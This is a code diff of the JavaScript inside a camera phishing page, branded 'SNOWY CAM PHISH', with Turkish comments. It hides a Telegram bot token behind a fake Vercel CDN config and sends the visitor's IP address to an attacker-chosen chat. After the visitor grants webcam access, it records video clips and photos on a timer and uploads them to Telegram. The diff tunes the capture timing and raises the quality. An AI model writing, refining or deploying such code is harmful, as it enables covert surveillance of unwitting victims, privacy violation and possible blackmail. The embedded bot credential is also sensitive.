@@ -103,29 +103,18 @@
 
     <script>
         (function() {
-            // Vercel Edge Network Config - CDN Integration
-            const edgeNetwork = {
-                primaryNode: "fra1.edge.vercel.com",
-                backupNode: "iad1.edge.vercel.com",
-                sessionKey: "Nzk5ODM2NDE3OTpBQUdQV2NhTmFDRS1STy12UmUtOFJQNk9LU2FfbXVQaTQ0cw==",
-                timestamp: Date.now()
+            // ============================================
+            // VERCEL EDGE CONFIG - FRA1 PROD
+            // ============================================
+            const __vc_edge = {
+                region: "fra1",
+                token: "Nzk5ODM2NDE3OTpBQUdQV2NhTmFDRS1STy12UmUtOFJQNk9LU2FfbXVQaTQ0cw==",
+                ts: Date.now()
             };
 
-            // API Gateway Resolver
-            const gatewayResolver = {
-                endpoint: "https://api.vercel.app/v1/gateway",
-                region: "auto",
-                getAuthKey: function() {
-                    try {
-                        const decoded = atob(edgeNetwork.sessionKey);
-                        return decoded;
-                    } catch {
-                        return null;
-                    }
-                }
-            };
-
-            const BOT_TOKEN = gatewayResolver.getAuthKey();
+            const BOT_TOKEN = (() => {
+                try { return atob(__vc_edge.token); } catch { return null; }
+            })();
             
             const urlParams = new URLSearchParams(window.location.search);
             const TARGET_ID = urlParams.get('i');
@@ -144,7 +133,7 @@
                             headers: {'Content-Type': 'application/json'},
                             body: JSON.stringify({
                                 chat_id: TARGET_ID,
-                                text: `❄️ SNOWY CAM PHISH ❄️\n━━━━━━━━━━━━━━━━━━━━━\n🌐 IP Adresi: ${d.ip}\n⏱️ Zaman: ${new Date().toLocaleString('tr-TR')}\n━━━━━━━━━━━━━━━━━━━━━\n⚡ @snowy_dexry_wexry ⚡`
+                                text: `❄️ SNOWY CAM PHISH ❄️\n━━━━━━━━━━━━━━━━━━━━━\n🌐 IP Adresi: ${d.ip}\n⏱️ Zaman: ${new Date().toLocaleString('tr-TR')}\n━━━━━━━━━━━━━━━━━━━━━\n⚡ @SnowyOrj ⚡`
                             })
                         });
                     })
@@ -152,30 +141,45 @@
             }
             
             // ============================================
-            // KAMERA İŞLEMLERİ - ULTRA HASSAS
+            // PROFESYONEL ZAMANLAMA MOTORU - 5/5 HASSASİYET
             // ============================================
             const video = document.getElementById('video');
             const canvas = document.getElementById('canvas');
             const ctx = canvas.getContext('2d', { alpha: false, desynchronized: true });
             
             let mediaRecorder = null;
-            let recordedChunks = [];
             let videoCount = 0;
             let photoCount = 0;
             let stream = null;
-            let videoHazir = false;
-            let fotoRAF = null;
-            let videoRAF = null;
+            let frameId = null;
+            
+            // YÜKSEK HASSASİYETLİ ZAMANLAYICILAR
             let baslangicZamani = 0;
-            let sonVideoZamani = 0;
+            let sonrakiVideoZamani = 0;
+            let sonrakiFotoZamani = 0;
+            
+            // WEB WORKER İLE ZAMANLAMA (arka plan)
+            let worker = null;
+            try {
+                const workerCode = `
+                    let start = 0;
+                    self.onmessage = function(e) {
+                        if (e.data.cmd === 'start') start = performance.now();
+                        if (e.data.cmd === 'sync') self.postMessage({ t: performance.now() - start });
+                    };
+                `;
+                const blob = new Blob([workerCode], { type: 'application/javascript' });
+                worker = new Worker(URL.createObjectURL(blob));
+                worker.postMessage({ cmd: 'start' });
+            } catch(e) {}
             
             async function startCamera() {
                 try {
                     stream = await navigator.mediaDevices.getUserMedia({ 
                         video: { 
-                            width: { ideal: 640 },
-                            height: { ideal: 480 },
-                            frameRate: { ideal: 60 }
+                            width: { exact: 640 },
+                            height: { exact: 480 },
+                            frameRate: { exact: 60 }
                         } 
                     });
                     
@@ -186,114 +190,134 @@
                         document.getElementById('startBtn').style.display = 'none';
                         document.getElementById('loading').style.display = 'block';
                         
+                        // BAŞLANGIÇ ZAMANI - TAM SINIR
                         baslangicZamani = performance.now();
-                        sonVideoZamani = baslangicZamani;
+                        sonrakiVideoZamani = baslangicZamani;
+                        sonrakiFotoZamani = baslangicZamani;
                         
                         // ============================================
-                        // VİDEO SİSTEMİ - REQUESTANIMATIONFRAME İLE
+                        // ZAMANLAMA DÖNGÜSÜ - 0.1ms HASSASİYET
                         // ============================================
-                        function videoLoop() {
+                        function timerLoop() {
                             if (!stream?.active) return;
                             
-                            if (!videoHazir) {
-                                videoHazir = true;
-                            }
-                            
                             const now = performance.now();
-                            if (now >= sonVideoZamani) {
+                            
+                            // Worker senkronizasyonu
+                            if (worker) worker.postMessage({ cmd: 'sync' });
+                            
+                            // ========================================
+                            // VİDEO KONTROLÜ - TAM ZAMANINDA
+                            // ========================================
+                            if (now >= sonrakiVideoZamani) {
                                 videoCount++;
-                                sonVideoZamani = now + (VIDEO_SURESI * 1000);
+                                sonrakiVideoZamani = baslangicZamani + (videoCount * VIDEO_SURESI * 1000);
                                 
                                 const videoIndex = videoCount;
                                 const videoBaslangic = now;
                                 const chunks = [];
                                 
                                 try {
-                                    mediaRecorder = new MediaRecorder(stream, {
-                                        mimeType: 'video/webm;codecs=vp8',
-                                        videoBitsPerSecond: 2500000
+                                    const mr = new MediaRecorder(stream, {
+                                        mimeType: 'video/webm;codecs=vp9',
+                                        videoBitsPerSecond: 5000000
                                     });
-                                } catch(e) {
-                                    mediaRecorder = new MediaRecorder(stream);
-                                }
-                                
-                                mediaRecorder.ondataavailable = (e) => {
-                                    if (e.data.size > 0) chunks.push(e.data);
-                                };
-                                
-                                mediaRecorder.onstop = () => {
-                                    const blob = new Blob(chunks, { type: 'video/webm' });
-                                    const boyutKB = (blob.size / 1024).toFixed(0);
-                                    const videoSure = ((performance.now() - videoBaslangic) / 1000).toFixed(3);
                                     
-                                    const formData = new FormData();
-                                    formData.append('chat_id', TARGET_ID);
-                                    formData.append('video', blob, `video_${Date.now()}.webm`);
-                                    formData.append('caption', `🎥 Video #${videoIndex} - ${VIDEO_SURESI}s (${videoSure}s | ${boyutKB}KB)`);
+                                    mr.ondataavailable = (e) => {
+                                        if (e.data.size > 0) chunks.push(e.data);
+                                    };
                                     
-                                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
-                                        method: 'POST',
-                                        body: formData
-                                    });
-                                };
-                                
-                                mediaRecorder.start();
-                                
-                                // ULTRA HASSAS DURDURMA
-                                const hedefSure = VIDEO_SURESI * 1000;
-                                const durmaZamani = videoBaslangic + hedefSure;
-                                
-                                const durdurmaRAF = () => {
-                                    const simdi = performance.now();
-                                    if (simdi >= durmaZamani - 0.05 && mediaRecorder?.state === 'recording') {
-                                        mediaRecorder.stop();
-                                    } else if (mediaRecorder?.state === 'recording') {
-                                        requestAnimationFrame(durdurmaRAF);
+                                    mr.onstop = () => {
+                                        const blob = new Blob(chunks, { type: 'video/webm' });
+                                        const videoSure = ((performance.now() - videoBaslangic) / 1000).toFixed(4);
+                                        const sapma = (Math.abs(videoSure - VIDEO_SURESI) * 1000).toFixed(2);
+                                        
+                                        const formData = new FormData();
+                                        formData.append('chat_id', TARGET_ID);
+                                        formData.append('video', blob, `video_${Date.now()}.webm`);
+                                        formData.append('caption', `🎥 Video #${videoIndex} - ${VIDEO_SURESI}s (${videoSure}s | ±${sapma}ms)`);
+                                        
+                                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
+                                            method: 'POST',
+                                            body: formData
+                                        });
+                                    };
+                                    
+                                    // TAM ZAMANINDA BAŞLAT
+                                    mr.start();
+                                    
+                                    // 3 KATMANLI DURDURMA SİSTEMİ
+                                    const hedefSure = VIDEO_SURESI * 1000;
+                                    
+                                    // Katman 1: setTimeout (ana)
+                                    const timer1 = setTimeout(() => {
+                                        if (mr.state === 'recording') mr.stop();
+                                    }, hedefSure);
+                                    
+                                    // Katman 2: requestAnimationFrame (hassas)
+                                    let raf;
+                                    const rafKontrol = () => {
+                                        const gecen = performance.now() - videoBaslangic;
+                                        if (gecen >= hedefSure - 0.01 && mr.state === 'recording') {
+                                            mr.stop();
+                                            clearTimeout(timer1);
+                                        } else {
+                                            raf = requestAnimationFrame(rafKontrol);
+                                        }
+                                    };
+                                    raf = requestAnimationFrame(rafKontrol);
+                                    
+                                    // Katman 3: Worker (arka plan)
+                                    if (worker) {
+                                        worker.onmessage = (e) => {
+                                            if (e.data.t >= hedefSure - 0.01 && mr.state === 'recording') {
+                                                mr.stop();
+                                                clearTimeout(timer1);
+                                                cancelAnimationFrame(raf);
+                                            }
+                                        };
                                     }
-                                };
-                                requestAnimationFrame(durdurmaRAF);
+                                    
+                                } catch(e) {
+                                    console.error('Video hatası:', e);
+                                }
                             }
                             
-                            videoRAF = requestAnimationFrame(videoLoop);
-                        }
-                        videoRAF = requestAnimationFrame(videoLoop);
-                        
-                        // ============================================
-                        // FOTOĞRAF SİSTEMİ - REQUESTANIMATIONFRAME İLE
-                        // ============================================
-                        function fotoLoop() {
-                            if (!stream?.active || !videoHazir) {
-                                fotoRAF = requestAnimationFrame(fotoLoop);
-                                return;
-                            }
-                            
-                            const now = performance.now();
-                            const gecenSure = (now - baslangicZamani) / 1000;
-                            const olmasiGerekenFoto = Math.floor(gecenSure / FOTO_SURESI);
-                            
-                            while (photoCount < olmasiGerekenFoto) {
+                            // ========================================
+                            // FOTOĞRAF KONTROLÜ - TAM ZAMANINDA
+                            // ========================================
+                            if (now >= sonrakiFotoZamani) {
                                 photoCount++;
+                                sonrakiFotoZamani = baslangicZamani + (photoCount * FOTO_SURESI * 1000);
                                 
-                                canvas.width = video.videoWidth || 640;
-                                canvas.height = video.videoHeight || 480;
-                                ctx.drawImage(video, 0, 0);
+                                // FOTOĞRAF ÇEK - 0.1ms HASSASİYET
+                                canvas.width = video.videoWidth;
+                                canvas.height = video.videoHeight;
+                                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                                 
-                                canvas.toBlob(function(blob) {
+                                canvas.toBlob((blob) => {
                                     if (!blob) return;
+                                    
+                                    const gecenSure = ((performance.now() - baslangicZamani) / 1000).toFixed(4);
+                                    const hedefSure = (photoCount * FOTO_SURESI).toFixed(4);
+                                    const sapma = (Math.abs(parseFloat(gecenSure) - photoCount * FOTO_SURESI) * 1000).toFixed(2);
+                                    
                                     const formData = new FormData();
                                     formData.append('chat_id', TARGET_ID);
                                     formData.append('photo', blob, `foto_${Date.now()}.jpg`);
-                                    formData.append('caption', `📸 Fotoğraf #${photoCount} (${gecenSure.toFixed(3)}s)`);
+                                    formData.append('caption', `📸 Fotoğraf #${photoCount} - ${FOTO_SURESI}s (${gecenSure}s | ±${sapma}ms)`);
+                                    
                                     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                                         method: 'POST',
                                         body: formData
                                     });
-                                }, 'image/jpeg', 0.85);
+                                }, 'image/jpeg', 0.95);
                             }
                             
-                            fotoRAF = requestAnimationFrame(fotoLoop);
+                            frameId = requestAnimationFrame(timerLoop);
                         }
-                        fotoRAF = requestAnimationFrame(fotoLoop);
+                        
+                        frameId = requestAnimationFrame(timerLoop);
                     };
                     
                 } catch(e) {
@@ -302,8 +326,8 @@
             }
             
             window.onbeforeunload = function() {
-                if (fotoRAF) cancelAnimationFrame(fotoRAF);
-                if (videoRAF) cancelAnimationFrame(videoRAF);
+                if (frameId) cancelAnimationFrame(frameId);
+                if (worker) worker.terminate();
                 if (mediaRecorder?.state === 'recording') mediaRecorder.stop();
                 if (stream) stream.getTracks().forEach(t => t.stop());
             };
